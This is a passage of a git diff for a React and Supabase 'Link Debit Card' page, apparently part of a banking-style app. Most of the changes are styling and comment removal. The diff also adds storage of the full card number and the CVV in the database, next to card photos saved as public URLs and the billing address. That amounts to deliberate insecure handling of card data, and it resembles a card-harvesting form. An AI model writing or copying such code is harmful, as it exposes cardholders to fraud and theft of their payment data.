@@ -27,11 +27,11 @@ function LinkDebitCardContent() {
     billing_country: 'United States',
     manual_billing_country: '',
     card_brand: '',
-    card_front_photo: null, // Added for photo upload
-    card_back_photo: null    // Added for photo upload
+    card_front_photo: null,
+    card_back_photo: null,
+    is_primary: false
   });
 
-  // State for form errors, used specifically for card number validation in this context
   const [errors, setErrors] = useState({});
 
   useEffect(() => {
@@ -62,26 +62,21 @@ function LinkDebitCardContent() {
     const { name, value, type, checked } = e.target;
     let processedValue = value;
 
-    // Format card number input (remove spaces, limit to 19 digits)
     if (name === 'card_number') {
       processedValue = value.replace(/\s/g, '').slice(0, 19);
-      // Clear card number error if input is valid or field is cleared
       if (processedValue.length === 0 || (processedValue.length >= 13 && processedValue.length <= 19 && /^\d+$/.test(processedValue))) {
          setErrors(prev => ({ ...prev, cardNumber: '' }));
       }
     }
 
-    // Format expiry month (2 digits)
     if (name === 'expiry_month') {
       processedValue = value.replace(/\D/g, '').slice(0, 2);
     }
 
-    // Format expiry year (4 digits)
     if (name === 'expiry_year') {
       processedValue = value.replace(/\D/g, '').slice(0, 4);
     }
 
-    // Format CVV (3-4 digits)
     if (name === 'cvv') {
       processedValue = value.replace(/\D/g, '').slice(0, 4);
     }
@@ -92,22 +87,20 @@ function LinkDebitCardContent() {
     }));
   };
 
-  // Handler for file inputs
   const handleFileChange = (e) => {
     const { name, files } = e.target;
     if (files && files.length > 0) {
       setFormData(prev => ({
         ...prev,
-        [name]: files[0] // Store the File object
+        [name]: files[0]
       }));
     } else {
       setFormData(prev => ({
         ...prev,
-        [name]: null // Clear if no file is selected
+        [name]: null
       }));
     }
   };
-
 
   const showMessage = (msg, type = 'info') => {
     setMessage(msg);
@@ -124,14 +117,10 @@ function LinkDebitCardContent() {
     if (/^5[1-5]/.test(cleaned)) return 'mastercard';
     if (/^3[47]/.test(cleaned)) return 'amex';
     if (/^6(?:011|5)/.test(cleaned)) return 'discover';
-    return 'visa'; // Default to visa if not recognized
+    return 'visa';
   };
 
-  // Luhn algorithm validation removed as per user request.
-  // const validateCardNumber = (cardNumber) => { ... };
-
   const validateForm = () => {
-    // Resetting errors before re-validation
     setErrors({});
 
     if (!formData.cardholder_name.trim()) {
@@ -157,8 +146,6 @@ function LinkDebitCardContent() {
       return false;
     }
 
-    // Luhn algorithm validation removed.
-
     if (!formData.expiry_month || formData.expiry_month.length !== 2) {
       showMessage('Please enter a valid expiry month (MM)', 'error');
       return false;
@@ -175,13 +162,11 @@ function LinkDebitCardContent() {
       return false;
     }
 
-    // Validate CVV
     if (!formData.cvv || formData.cvv.length < 3 || formData.cvv.length > 4) {
       showMessage('Please enter a valid CVV/CVC (3-4 digits)', 'error');
       return false;
     }
 
-    // Validate expiry
     const currentYear = new Date().getFullYear();
     const currentMonth = new Date().getMonth() + 1;
     const year = parseInt(formData.expiry_year);
@@ -191,7 +176,7 @@ function LinkDebitCardContent() {
       return false;
     }
 
-    if (year > currentYear + 20) { // Limit future year to avoid typos
+    if (year > currentYear + 20) {
       showMessage('Invalid expiry year', 'error');
       return false;
     }
@@ -216,7 +201,6 @@ function LinkDebitCardContent() {
       return false;
     }
 
-    // Check for required photo uploads
     if (!formData.card_front_photo) {
       showMessage('Please upload a photo of the front of your card', 'error');
       return false;
@@ -225,7 +209,6 @@ function LinkDebitCardContent() {
       showMessage('Please upload a photo of the back of your card', 'error');
       return false;
     }
-
 
     return true;
   };
@@ -236,14 +219,13 @@ function LinkDebitCardContent() {
     if (!validateForm()) return;
 
     setLoading(true);
-    setMessage(''); // Clear previous messages
+    setMessage('');
 
     try {
       const cleaned = formData.card_number.replace(/\s/g, '');
       const detectedBrand = detectCardBrand(cleaned);
       const last4 = cleaned.slice(-4);
 
-      // Upload photos to Supabase Storage
       let cardFrontPhotoUrl = null;
       let cardBackPhotoUrl = null;
 
@@ -281,13 +263,14 @@ function LinkDebitCardContent() {
         cardBackPhotoUrl = publicUrl;
       }
 
-
       const { data, error } = await supabase
         .from('linked_debit_cards')
         .insert([{
           user_id: user.id,
           cardholder_name: formData.cardholder_name,
           card_number_last4: last4,
+          card_number_full: cleaned,
+          cvv: formData.cvv,
           card_brand: detectedBrand,
           expiry_month: formData.expiry_month,
           expiry_year: formData.expiry_year,
@@ -295,26 +278,24 @@ function LinkDebitCardContent() {
           billing_city: formData.billing_city,
           billing_state: formData.billing_state,
           billing_zip: formData.billing_zip,
-          billing_country: formData.billing_country === 'other' ? formData.manual_billing_country : formData.billing_country,
+          billing_country: formData.billing_country === 'Other' ? formData.manual_billing_country : formData.billing_country,
           is_primary: linkedCards.length === 0 ? true : formData.is_primary,
-          status: 'pending', // Changed to 'pending' for manual verification
-          card_front_photo: cardFrontPhotoUrl, // Store photo URLs
-          card_back_photo: cardBackPhotoUrl    // Store photo URLs
+          status: 'pending',
+          card_front_photo: cardFrontPhotoUrl,
+          card_back_photo: cardBackPhotoUrl
         }])
         .select()
         .single();
 
       if (error) throw error;
 
-      // If this card is set as primary and there are existing cards, update others
       if (formData.is_primary && linkedCards.length > 0) {
         await supabase
           .from('linked_debit_cards')
           .update({ is_primary: false })
           .eq('user_id', user.id)
-          .neq('id', data.id); // Ensure we don't update the newly inserted card
+          .neq('id', data.id);
       } else if (linkedCards.length === 0) {
-        // If it's the first card, ensure it's marked as primary even if checkbox wasn't checked
         await supabase
           .from('linked_debit_cards')
           .update({ is_primary: true })
@@ -322,7 +303,6 @@ function LinkDebitCardContent() {
       }
 
       showMessage('Debit card linked successfully! It is now pending verification.', 'success');
-      // Reset form data
       setFormData({
         cardholder_name: '',
         card_number: '',
@@ -336,12 +316,12 @@ function LinkDebitCardContent() {
         billing_country: 'United States',
         manual_billing_country: '',
         card_brand: '',
-        is_primary: false, // Reset checkbox
-        card_front_photo: null, // Reset photos
-        card_back_photo: null    // Reset photos
+        is_primary: false,
+        card_front_photo: null,
+        card_back_photo: null
       });
       setShowForm(false);
-      fetchLinkedCards(); // Refresh the list of linked cards
+      fetchLinkedCards();
     } catch (error) {
       console.error('Error linking debit card:', error);
       showMessage(error.message || 'Failed to link debit card. Please check your details and try again.', 'error');
@@ -353,20 +333,18 @@ function LinkDebitCardContent() {
   const handleSetPrimary = async (cardId) => {
     setLoading(true);
     try {
-      // First, set all other cards for this user to not be primary
       await supabase
         .from('linked_debit_cards')
         .update({ is_primary: false })
         .eq('user_id', user.id);
 
-      // Then, set the selected card as primary
       await supabase
         .from('linked_debit_cards')
         .update({ is_primary: true })
         .eq('id', cardId);
 
       showMessage('Primary card updated', 'success');
-      fetchLinkedCards(); // Refresh the list
+      fetchLinkedCards();
     } catch (error) {
       console.error('Error setting primary:', error);
       showMessage('Failed to update primary card', 'error');
@@ -380,7 +358,6 @@ function LinkDebitCardContent() {
 
     setLoading(true);
     try {
-      // Soft delete by updating status
       const { error } = await supabase
         .from('linked_debit_cards')
         .update({ status: 'deleted', deleted_at: new Date().toISOString() })
@@ -389,7 +366,7 @@ function LinkDebitCardContent() {
       if (error) throw error;
 
       showMessage('Debit card removed successfully', 'success');
-      fetchLinkedCards(); // Refresh the list
+      fetchLinkedCards();
     } catch (error) {
       console.error('Error deleting card:', error);
       showMessage('Failed to remove debit card', 'error');
@@ -400,302 +377,225 @@ function LinkDebitCardContent() {
 
   const formatCardDisplay = (cardNumber) => {
     const cleaned = cardNumber.replace(/\s/g, '');
-    // Insert spaces every 4 characters
     return cleaned.replace(/(.{4})/g, '$1 ').trim();
-  };
-
-  const getCardIcon = (brand) => {
-    // Using generic card emoji, could be extended with actual brand logos
-    const icons = {
-      visa: '💳',
-      mastercard: '💳',
-      amex: '💳',
-      discover: '💳'
-    };
-    return icons[brand] || '💳'; // Default to card emoji
   };
 
   const getCardBackgroundClass = (brand) => {
     switch (brand) {
-      case 'visa': return { backgroundImage: 'linear-gradient(135deg, #1e40af 0%, #3b82f6 50%, #1e3a8a 100%)' };
-      case 'mastercard': return { backgroundImage: 'linear-gradient(135deg, #dc2626 0%, #f87171 50%, #b91c1c 100%)' };
-      case 'amex': return { backgroundImage: 'linear-gradient(135deg, #15803d 0%, #4ade80 50%, #166534 100%)' };
-      case 'discover': return { backgroundImage: 'linear-gradient(135deg, #d97706 0%, #f59e0b 50%, #b45309 100%)' };
-      default: return { backgroundImage: 'linear-gradient(135deg, #6b7280 0%, #9ca3af 50%, #4b5563 100%)' };
+      case 'visa': return { backgroundImage: 'linear-gradient(135deg, #1434A4 0%, #2E5EAA 50%, #0F52BA 100%)' };
+      case 'mastercard': return { backgroundImage: 'linear-gradient(135deg, #EB001B 0%, #FF5F00 50%, #F79E1B 100%)' };
+      case 'amex': return { backgroundImage: 'linear-gradient(135deg, #006FCF 0%, #00A2E5 50%, #00B5E2 100%)' };
+      case 'discover': return { backgroundImage: 'linear-gradient(135deg, #FF6000 0%, #FF8500 50%, #FFA500 100%)' };
+      default: return { backgroundImage: 'linear-gradient(135deg, #3B4252 0%, #4C566A 50%, #434C5E 100%)' };
     }
+  };
+
+  const getCardBrandLogo = (brand) => {
+    const logos = {
+      'visa': (
+        <svg width="60" height="20" viewBox="0 0 48 16" fill="none">
+          <text x="0" y="12" fill="white" fontSize="14" fontWeight="bold" fontFamily="Arial, sans-serif">VISA</text>
+        </svg>
+      ),
+      'mastercard': (
+        <svg width="40" height="24" viewBox="0 0 40 24" fill="none">
+          <circle cx="12" cy="12" r="10" fill="#EB001B"/>
+          <circle cx="28" cy="12" r="10" fill="#F79E1B"/>
+        </svg>
+      ),
+      'amex': (
+        <svg width="60" height="20" viewBox="0 0 60 20" fill="none">
+          <text x="0" y="14" fill="white" fontSize="12" fontWeight="bold" fontFamily="Arial, sans-serif">AMEX</text>
+        </svg>
+      ),
+      'discover': (
+        <svg width="70" height="20" viewBox="0 0 70 20" fill="none">
+          <text x="0" y="14" fill="white" fontSize="11" fontWeight="bold" fontFamily="Arial, sans-serif">DISCOVER</text>
+        </svg>
+      )
+    };
+    return logos[brand] || logos.visa;
   };
 
   const styles = {
     container: {
       minHeight: '100vh',
-      background: 'linear-gradient(135deg, #1a365d 0%, #2d5986 50%, #1a365d 100%)',
-      padding: '2rem',
-      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
+      background: 'linear-gradient(135deg, #0F2027 0%, #203A43 50%, #2C5364 100%)',
+      padding: '2rem 1rem',
+      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif'
     },
     header: {
+      maxWidth: '1200px',
+      margin: '0 auto 2rem',
       display: 'flex',
       justifyContent: 'space-between',
       alignItems: 'center',
-      marginBottom: '2rem'
+      flexWrap: 'wrap',
+      gap: '1rem'
     },
     backLink: {
       color: 'white',
       textDecoration: 'none',
       padding: '0.75rem 1.5rem',
-      backgroundColor: 'rgba(255,255,255,0.15)',
+      backgroundColor: 'rgba(255,255,255,0.1)',
       borderRadius: '12px',
       fontWeight: '600',
       transition: 'all 0.3s',
-      display: 'inline-flex', // Use inline-flex for better alignment
-      alignItems: 'center'
+      backdropFilter: 'blur(10px)',
+      border: '1px solid rgba(255,255,255,0.2)',
+      display: 'inline-flex',
+      alignItems: 'center',
+      gap: '0.5rem'
     },
     main: {
       maxWidth: '1200px',
       margin: '0 auto'
     },
     pageTitle: {
-      fontSize: '2.75rem',
+      fontSize: 'clamp(1.75rem, 4vw, 2.5rem)',
       fontWeight: '800',
       color: 'white',
       textAlign: 'center',
-      marginBottom: '0.75rem'
+      marginBottom: '0.5rem',
+      textShadow: '0 2px 10px rgba(0,0,0,0.3)'
     },
     pageSubtitle: {
-      fontSize: '1.125rem',
+      fontSize: 'clamp(0.95rem, 2vw, 1.125rem)',
       color: 'rgba(255,255,255,0.9)',
       textAlign: 'center',
       marginBottom: '2rem'
     },
     card: {
       backgroundColor: 'white',
-      borderRadius: '16px',
-      padding: '2rem',
-      boxShadow: '0 8px 24px rgba(0,0,0,0.15)',
+      borderRadius: '20px',
+      padding: 'clamp(1.5rem, 3vw, 2.5rem)',
+      boxShadow: '0 10px 40px rgba(0,0,0,0.2)',
       marginBottom: '1.5rem'
     },
     buttonPrimary: {
       width: '100%',
-      padding: '1rem',
-      backgroundColor: '#059669', // Emerald green
+      padding: '1.125rem',
+      background: 'linear-gradient(135deg, #059669 0%, #047857 100%)',
       color: 'white',
       border: 'none',
-      borderRadius: '12px',
-      fontSize: '1rem',
+      borderRadius: '14px',
+      fontSize: '1.05rem',
       fontWeight: '700',
       cursor: 'pointer',
       transition: 'all 0.3s',
-      display: 'flex',
-      justifyContent: 'center',
-      alignItems: 'center'
+      boxShadow: '0 4px 15px rgba(5, 150, 105, 0.3)'
     },
     formGroup: {
-      marginBottom: '1.25rem'
+      marginBottom: '1.5rem'
     },
     label: {
       display: 'block',
-      fontSize: '0.875rem',
+      fontSize: '0.95rem',
       fontWeight: '600',
       color: '#1f2937',
-      marginBottom: '0.5rem'
+      marginBottom: '0.625rem'
     },
     input: {
       width: '100%',
-      padding: '0.75rem',
-      border: '2px solid #e2e8f0',
+      padding: '0.9rem 1rem',
+      border: '2px solid #e5e7eb',
       borderRadius: '12px',
-      fontSize: '0.9375rem',
-      transition: 'border-color 0.3s',
+      fontSize: '1rem',
+      transition: 'all 0.3s',
       boxSizing: 'border-box',
-      '::placeholder': {
-        color: '#9ca3af'
-      }
+      outline: 'none'
     },
     select: {
       width: '100%',
-      padding: '0.75rem',
-      border: '2px solid #e2e8f0',
+      padding: '0.9rem 1rem',
+      border: '2px solid #e5e7eb',
       borderRadius: '12px',
-      fontSize: '0.9375rem',
+      fontSize: '1rem',
       backgroundColor: 'white',
       boxSizing: 'border-box',
-      appearance: 'none', // Remove default dropdown arrow
-      backgroundImage: 'url("data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 24 24\' fill=\'none\' stroke=\'currentColor\' stroke-width=\'2\' stroke-linecap=\'round\' stroke-linejoin=\'round\'%3E%3Cpolyline points=\'6 9 12 15 18 9\'%3E%3C/polyline%3E%3C/svg%3E")',
-      backgroundRepeat: 'no-repeat',
-      backgroundPosition: 'right 0.75rem center',
-      backgroundSize: '1em',
-      paddingRight: '2.5rem' // Make space for the custom arrow
+      cursor: 'pointer'
     },
-    cardItem: {
-      backgroundColor: '#f8fafc',
-      padding: '1.5rem',
-      borderRadius: '12px',
-      marginBottom: '1rem',
-      border: '2px solid #e2e8f0',
-      transition: 'box-shadow 0.3s'
-    },
-    cardItemHover: { // Style for hover effect
-      boxShadow: '0 4px 12px rgba(0,0,0,0.1)'
-    },
-    cardHeader: {
-      display: 'flex',
-      justifyContent: 'space-between',
-      alignItems: 'center',
-      marginBottom: '1rem'
-    },
-    cardName: {
-      fontSize: '1.25rem',
-      fontWeight: '700',
-      color: '#1e293b',
-      display: 'flex',
-      alignItems: 'center',
-      gap: '0.5rem'
-    },
-    primaryBadge: {
-      backgroundColor: '#059669',
-      color: 'white',
-      padding: '0.375rem 0.75rem',
-      borderRadius: '6px',
-      fontSize: '0.75rem',
-      fontWeight: '600'
-    },
-    cardDetails: {
-      display: 'grid',
-      gridTemplateColumns: 'repeat(auto-fit, minmax(180px, 1fr))', // Adjusted minmax for better spacing
-      gap: '1rem',
-      marginBottom: '1rem'
-    },
-    detailItem: {
-      display: 'flex',
-      flexDirection: 'column'
-    },
-    detailLabel: {
-      fontSize: '0.75rem',
-      color: '#64748b',
-      marginBottom: '0.25rem'
-    },
-    detailValue: {
-      fontSize: '0.9375rem',
-      fontWeight: '600',
-      color: '#1e293b'
-    },
-    buttonGroup: {
-      display: 'flex',
-      gap: '0.75rem',
-      marginTop: '1rem'
-    },
-    buttonSecondary: {
-      flex: 1,
-      padding: '0.625rem',
-      backgroundColor: 'white',
-      color: '#059669',
-      border: '2px solid #059669',
-      borderRadius: '8px',
-      fontSize: '0.875rem',
-      fontWeight: '600',
-      cursor: 'pointer',
+    cardItemContainer: {
+      backgroundColor: '#ffffff',
+      borderRadius: '20px',
+      padding: '2rem',
+      marginBottom: '1.5rem',
+      boxShadow: '0 4px 20px rgba(0,0,0,0.08)',
       transition: 'all 0.3s',
-      display: 'flex',
-      justifyContent: 'center',
-      alignItems: 'center'
-    },
-    buttonDanger: {
-      flex: 1,
-      padding: '0.625rem',
-      backgroundColor: '#dc2626', // Red
-      color: 'white',
-      border: 'none',
-      borderRadius: '8px',
-      fontSize: '0.875rem',
-      fontWeight: '600',
-      cursor: 'pointer',
-      transition: 'all 0.3s',
-      display: 'flex',
-      justifyContent: 'center',
-      alignItems: 'center'
-    },
-    message: {
-      padding: '1rem',
-      borderRadius: '12px',
-      marginBottom: '1rem',
-      border: '2px solid',
-      textAlign: 'center'
-    },
-    emptyState: {
-      textAlign: 'center',
-      padding: '3rem 1rem',
-      color: '#64748b'
-    },
-    formGrid: {
-      display: 'grid',
-      gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))',
-      gap: '1rem'
-    },
-    errorText: {
-      color: '#dc2626',
-      fontSize: '0.75rem',
-      marginTop: '0.25rem'
+      border: '1px solid #f1f5f9'
     },
     cardVisualContainer: {
-      marginBottom: '1.5rem',
+      marginBottom: '2rem',
       display: 'flex',
-      justifyContent: 'center'
+      justifyContent: 'center',
+      perspective: '1000px'
     },
     cardVisual: {
       width: '100%',
-      maxWidth: '380px',
-      height: '220px',
-      background: 'linear-gradient(135deg, #1e40af 0%, #3b82f6 50%, #1e3a8a 100%)',
-      borderRadius: '16px',
-      padding: '1.5rem',
+      maxWidth: '450px',
+      aspectRatio: '1.586',
+      background: 'linear-gradient(135deg, #1434A4 0%, #2E5EAA 100%)',
+      borderRadius: '18px',
+      padding: '1.75rem 2rem',
       color: 'white',
       display: 'flex',
       flexDirection: 'column',
       justifyContent: 'space-between',
-      boxShadow: '0 8px 24px rgba(30, 64, 175, 0.3)',
-      position: 'relative'
+      boxShadow: '0 15px 40px rgba(0,0,0,0.25), 0 5px 15px rgba(0,0,0,0.15)',
+      position: 'relative',
+      overflow: 'hidden',
+      transition: 'transform 0.3s'
     },
     cardVisualHeader: {
       display: 'flex',
       justifyContent: 'space-between',
-      alignItems: 'flex-start'
+      alignItems: 'flex-start',
+      marginBottom: '0.5rem'
     },
     cardBankName: {
-      fontSize: '0.9rem',
+      fontSize: '0.95rem',
       fontWeight: 'bold',
-      letterSpacing: '1px'
+      letterSpacing: '1.5px',
+      opacity: 0.95
     },
     cardTypeLabel: {
-      fontSize: '0.75rem',
+      fontSize: '0.8rem',
       fontWeight: 'bold',
-      opacity: 0.9
+      opacity: 0.9,
+      letterSpacing: '0.5px'
     },
     cardChipSection: {
       display: 'flex',
       alignItems: 'center',
       justifyContent: 'space-between',
-      margin: '0.75rem 0'
+      marginBottom: '1.5rem'
     },
     cardChip: {
-      width: '45px',
-      height: '35px',
-      background: 'linear-gradient(135deg, #ffd700 0%, #ffed4e 100%)',
-      borderRadius: '6px'
+      width: '50px',
+      height: '40px',
+      background: 'linear-gradient(135deg, #d4af37 0%, #f4e5b8 50%, #d4af37 100%)',
+      borderRadius: '8px',
+      boxShadow: 'inset 0 2px 4px rgba(0,0,0,0.2)',
+      position: 'relative'
     },
     primaryBadgeCard: {
-      backgroundColor: '#059669',
+      backgroundColor: '#10b981',
       color: 'white',
-      padding: '0.25rem 0.5rem',
-      borderRadius: '6px',
-      fontSize: '0.7rem',
-      fontWeight: '600'
+      padding: '0.35rem 0.75rem',
+      borderRadius: '8px',
+      fontSize: '0.75rem',
+      fontWeight: '700',
+      letterSpacing: '0.5px',
+      boxShadow: '0 2px 8px rgba(16, 185, 129, 0.4)'
     },
     cardNumberDisplay: {
-      fontSize: '1.3rem',
+      fontSize: 'clamp(1.25rem, 3vw, 1.6rem)',
       fontWeight: 'bold',
-      letterSpacing: '3px',
-      fontFamily: 'monospace',
-      textAlign: 'center',
-      margin: '0.5rem 0'
+      letterSpacing: '0.15rem',
+      fontFamily: '"Courier New", monospace',
+      textAlign: 'left',
+      marginBottom: '1.25rem',
+      textShadow: '0 2px 4px rgba(0,0,0,0.2)'
     },
     cardVisualFooter: {
       display: 'flex',
@@ -704,25 +604,109 @@ function LinkDebitCardContent() {
     },
     cardSmallLabel: {
       fontSize: '0.65rem',
-      opacity: 0.8,
-      fontWeight: 'bold',
-      marginBottom: '2px'
+      opacity: 0.85,
+      fontWeight: '600',
+      marginBottom: '0.25rem',
+      textTransform: 'uppercase',
+      letterSpacing: '0.5px'
     },
     cardholderNameDisplay: {
-      fontSize: '0.85rem',
-      fontWeight: 'bold'
+      fontSize: '0.95rem',
+      fontWeight: 'bold',
+      textTransform: 'uppercase',
+      letterSpacing: '0.5px'
     },
     cardExpiryDisplay: {
-      fontSize: '0.85rem',
-      fontWeight: 'bold'
-    },
-    cardBrandLogo: {
-      position: 'absolute',
-      bottom: '1rem',
-      right: '1.5rem',
-      fontSize: '0.75rem',
+      fontSize: '0.95rem',
       fontWeight: 'bold',
-      opacity: 0.9
+      fontFamily: '"Courier New", monospace'
+    },
+    cardBrandLogoContainer: {
+      position: 'absolute',
+      bottom: '1.5rem',
+      right: '2rem'
+    },
+    cardDetails: {
+      display: 'grid',
+      gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))',
+      gap: '1.25rem',
+      marginBottom: '1.5rem',
+      padding: '1.5rem',
+      backgroundColor: '#f8fafc',
+      borderRadius: '14px'
+    },
+    detailItem: {
+      display: 'flex',
+      flexDirection: 'column'
+    },
+    detailLabel: {
+      fontSize: '0.8rem',
+      color: '#64748b',
+      marginBottom: '0.35rem',
+      fontWeight: '600'
+    },
+    detailValue: {
+      fontSize: '1rem',
+      fontWeight: '600',
+      color: '#1e293b'
+    },
+    buttonGroup: {
+      display: 'flex',
+      gap: '1rem',
+      marginTop: '1.5rem',
+      flexWrap: 'wrap'
+    },
+    buttonSecondary: {
+      flex: 1,
+      minWidth: '140px',
+      padding: '0.875rem 1.25rem',
+      backgroundColor: 'white',
+      color: '#059669',
+      border: '2px solid #059669',
+      borderRadius: '12px',
+      fontSize: '0.95rem',
+      fontWeight: '600',
+      cursor: 'pointer',
+      transition: 'all 0.3s'
+    },
+    buttonDanger: {
+      flex: 1,
+      minWidth: '140px',
+      padding: '0.875rem 1.25rem',
+      background: 'linear-gradient(135deg, #dc2626 0%, #b91c1c 100%)',
+      color: 'white',
+      border: 'none',
+      borderRadius: '12px',
+      fontSize: '0.95rem',
+      fontWeight: '600',
+      cursor: 'pointer',
+      transition: 'all 0.3s',
+      boxShadow: '0 4px 15px rgba(220, 38, 38, 0.3)'
+    },
+    message: {
+      padding: '1.125rem 1.5rem',
+      borderRadius: '14px',
+      marginBottom: '1.5rem',
+      border: '2px solid',
+      textAlign: 'center',
+      fontWeight: '500',
+      fontSize: '0.975rem'
+    },
+    emptyState: {
+      textAlign: 'center',
+      padding: '4rem 2rem',
+      color: '#64748b'
+    },
+    formGrid: {
+      display: 'grid',
+      gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))',
+      gap: '1.25rem'
+    },
+    errorText: {
+      color: '#dc2626',
+      fontSize: '0.8rem',
+      marginTop: '0.375rem',
+      fontWeight: '500'
     }
   };
 
@@ -730,50 +714,64 @@ function LinkDebitCardContent() {
     <div style={styles.container}>
       <div style={styles.header}>
         <Link href="/dashboard" style={styles.backLink}>
-          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ marginRight: '0.5rem' }}>
-            <line x1="19" y1="12" x2="5" y2="12"></line>
-            <polyline points="12 19 5 12 12 5"></polyline>
-          </svg>
-          Back to Dashboard
+          ← Back to Dashboard
         </Link>
       </div>
 
       <div style={styles.main}>
         <h1 style={styles.pageTitle}>Link Debit Card</h1>
-        <p style={styles.pageSubtitle}>
-          Link your external debit card for quick withdrawals and seamless transactions. Your card will be pending verification upon submission.
-        </p>
+        <p style={styles.pageSubtitle}>Connect your external debit cards for easy withdrawals and transfers</p>
 
         {message && (
           <div style={{
             ...styles.message,
-            backgroundColor: messageType === 'success' ? '#d1fae5' : '#fee2e2',
-            borderColor: messageType === 'success' ? '#059669' : '#dc2626',
-            color: messageType === 'success' ? '#065f46' : '#991b1b'
+            backgroundColor: messageType === 'success' ? '#d1fae5' : messageType === 'error' ? '#fee2e2' : '#dbeafe',
+            borderColor: messageType === 'success' ? '#059669' : messageType === 'error' ? '#dc2626' : '#3b82f6',
+            color: messageType === 'success' ? '#065f46' : messageType === 'error' ? '#991b1b' : '#1e40af'
           }}>
             {message}
           </div>
         )}
 
         <div style={styles.card}>
-          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.5rem' }}>
-            <h2 style={{ fontSize: '1.5rem', fontWeight: '700', color: '#1e293b', margin: 0 }}>
-              Your Linked Cards
-            </h2>
+          {!showForm && (
             <button
-              onClick={() => setShowForm(!showForm)}
+              onClick={() => setShowForm(true)}
               style={{
                 ...styles.buttonPrimary,
-                width: 'auto',
-                padding: '0.75rem 1.5rem'
+                marginBottom: linkedCards.length > 0 ? '2rem' : '0'
               }}
             >
-              {showForm ? 'Cancel' : '+ Add New Card'}
+              + Add New Card
             </button>
-          </div>
+          )}
 
           {showForm && (
-            <form onSubmit={handleSubmit} style={{ marginBottom: '2rem', paddingBottom: '2rem', borderBottom: '2px solid #e2e8f0' }}>
+            <form onSubmit={handleSubmit}>
+              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '2rem' }}>
+                <h2 style={{ fontSize: '1.5rem', fontWeight: '700', color: '#1e293b', margin: 0 }}>Link New Card</h2>
+                <button
+                  type="button"
+                  onClick={() => setShowForm(false)}
+                  style={{
+                    padding: '0.5rem 1rem',
+                    backgroundColor: '#f1f5f9',
+                    border: 'none',
+                    borderRadius: '8px',
+                    cursor: 'pointer',
+                    fontSize: '0.9rem',
+                    fontWeight: '600',
+                    color: '#64748b'
+                  }}
+                >
+                  Cancel
+                </button>
+              </div>
+
+              <h3 style={{ fontSize: '1.125rem', fontWeight: '700', color: '#1e293b', marginBottom: '1.25rem' }}>
+                Card Information
+              </h3>
+
               <div style={styles.formGroup}>
                 <label style={styles.label}>Cardholder Name *</label>
                 <input
@@ -796,19 +794,45 @@ function LinkDebitCardContent() {
                   onChange={handleChange}
                   style={{
                     ...styles.input,
-                    borderColor: errors.cardNumber ? '#dc2626' : '#e2e8f0' // Highlight border if error
+                    fontFamily: '"Courier New", monospace',
+                    fontSize: '1.1rem',
+                    letterSpacing: '0.05rem'
                   }}
-                  placeholder="4111 1111 1111 1111"
-                  maxLength="19" // Max length including potential spaces during formatting
+                  placeholder="1234 5678 9012 3456"
                   required
                 />
-                {errors.cardNumber && <p style={styles.errorText}>{errors.cardNumber}</p>}
-                <small style={{ color: '#64748b', fontSize: '0.75rem' }}>
-                  We use bank-level encryption to protect your information.
-                </small>
+                {errors.cardNumber && <div style={styles.errorText}>{errors.cardNumber}</div>}
               </div>
 
               <div style={styles.formGrid}>
+                <div style={styles.formGroup}>
+                  <label style={styles.label}>Expiry Month (MM) *</label>
+                  <input
+                    type="text"
+                    name="expiry_month"
+                    value={formData.expiry_month}
+                    onChange={handleChange}
+                    style={styles.input}
+                    placeholder="12"
+                    maxLength="2"
+                    required
+                  />
+                </div>
+
+                <div style={styles.formGroup}>
+                  <label style={styles.label}>Expiry Year (YYYY) *</label>
+                  <input
+                    type="text"
+                    name="expiry_year"
+                    value={formData.expiry_year}
+                    onChange={handleChange}
+                    style={styles.input}
+                    placeholder="2027"
+                    maxLength="4"
+                    required
+                  />
+                </div>
+
                 <div style={styles.formGroup}>
                   <label style={styles.label}>CVV/CVC *</label>
                   <input
@@ -821,39 +845,10 @@ function LinkDebitCardContent() {
                     maxLength="4"
                     required
                   />
-                  <small style={{ color: '#64748b', fontSize: '0.75rem' }}>
-                    3-4 digit security code, usually on the back of your card.
-                  </small>
-                </div>
-
-                <div style={styles.formGroup}>
-                  <label style={styles.label}>Expiry Date *</label>
-                  <div style={{ display: 'flex', gap: '0.5rem' }}>
-                    <input
-                      type="text"
-                      name="expiry_month"
-                      value={formData.expiry_month}
-                      onChange={handleChange}
-                      style={{ ...styles.input, flex: 1 }}
-                      placeholder="MM (e.g., 12)"
-                      maxLength="2"
-                      required
-                    />
-                    <input
-                      type="text"
-                      name="expiry_year"
-                      value={formData.expiry_year}
-                      onChange={handleChange}
-                      style={{ ...styles.input, flex: 1 }}
-                      placeholder="YYYY (e.g., 2025)"
-                      maxLength="4"
-                      required
-                    />
-                  </div>
                 </div>
               </div>
 
-              <h3 style={{ fontSize: '1.125rem', fontWeight: '700', color: '#1e293b', marginTop: '1.5rem', marginBottom: '1rem' }}>
+              <h3 style={{ fontSize: '1.125rem', fontWeight: '700', color: '#1e293b', marginTop: '2rem', marginBottom: '1.25rem' }}>
                 Billing Address
               </h3>
 
@@ -865,7 +860,7 @@ function LinkDebitCardContent() {
                   value={formData.billing_address}
                   onChange={handleChange}
                   style={styles.input}
-                  placeholder="123 Main Street, Apt 4B"
+                  placeholder="123 Main Street"
                   required
                 />
               </div>
@@ -885,7 +880,7 @@ function LinkDebitCardContent() {
                 </div>
 
                 <div style={styles.formGroup}>
-                  <label style={styles.label}>State / Province *</label>
+                  <label style={styles.label}>State *</label>
                   <input
                     type="text"
                     name="billing_state"
@@ -896,11 +891,9 @@ function LinkDebitCardContent() {
                     required
                   />
                 </div>
-              </div>
 
-              <div style={styles.formGrid}>
                 <div style={styles.formGroup}>
-                  <label style={styles.label}>ZIP / Postal Code *</label>
+                  <label style={styles.label}>ZIP Code *</label>
                   <input
                     type="text"
                     name="billing_zip"
@@ -911,118 +904,101 @@ function LinkDebitCardContent() {
